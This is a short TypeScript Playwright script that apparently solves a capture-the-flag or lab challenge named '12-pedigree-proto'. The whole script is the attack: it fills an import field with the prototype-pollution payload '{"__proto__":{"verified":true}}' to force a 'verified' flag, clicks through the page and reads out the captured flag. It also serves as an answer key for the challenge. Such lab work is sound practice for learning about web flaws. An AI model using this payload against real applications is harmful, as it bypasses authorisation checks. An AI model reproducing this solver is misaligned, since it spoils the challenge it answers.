import type { Page } from "@playwright/test";

export async function solve(page: Page) {
  await page.goto("/targets/12-pedigree-proto.html");
  await page.fill("#import-json", '{"__proto__":{"verified":true}}');
  await page.click("#import");
  await page.click("#review");
  return page.locator("#flag").textContent();
}
